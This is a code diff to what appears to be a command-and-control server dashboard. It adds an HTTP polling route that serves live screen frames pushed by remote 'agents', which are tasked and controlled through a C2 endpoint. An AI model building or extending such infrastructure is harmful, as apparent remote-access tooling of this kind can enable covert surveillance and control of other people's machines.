@@ -433,6 +433,7 @@ function startStream() {
   if (!selectedAgent) { log('No agent selected!', 'warn'); return; }
   streaming = true;
   socket.emit('join_live', {agent_id: selectedAgent, key: '{{ secret }}'});
+  startPollFrames();  // HTTP polling fallback
   
   // Issue live task to agent via C2
   fetch('/functions/c2Server', {
@@ -659,7 +660,7 @@ def push_frame():
     
     # Store latest frame
     with _live_lock:
-        _live_frames[agent_id] = {"frame": frame, "ts": int(time.time() * 1000)}
+        _live_frames[agent_id] = {"frame": frame, "ts": int(time.time() * 1000), "width": width, "height": height}
     
     # Broadcast to dashboard viewers
     socketio.emit('frame', {
@@ -675,6 +676,21 @@ def push_frame():
         events = _ctrl_queue.pop(agent_id, [])
     
     return jsonify({"ok": True, "events": events})
+
+# ══════════════════════════════════════════════════════════════
+#  LIVE FRAME PULL (browser polls this directly)
+# ══════════════════════════════════════════════════════════════
+@app.route("/live/frame/<agent_id>", methods=["GET"])
+def get_frame(agent_id):
+    key_param = request.args.get("key", "")
+    if key_param != SECRET_KEY:
+        return "Unauthorized", 401
+    with _live_lock:
+        data = _live_frames.get(agent_id)
+    if not data:
+        return jsonify({"frame": None, "ts": 0})
+    return jsonify({"frame": data["frame"], "ts": data["ts"],
+                    "width": data.get("width", 800), "height": data.get("height", 600)})
 
 # ══════════════════════════════════════════════════════════════
 #  LIVE DASHBOARD ROUTE
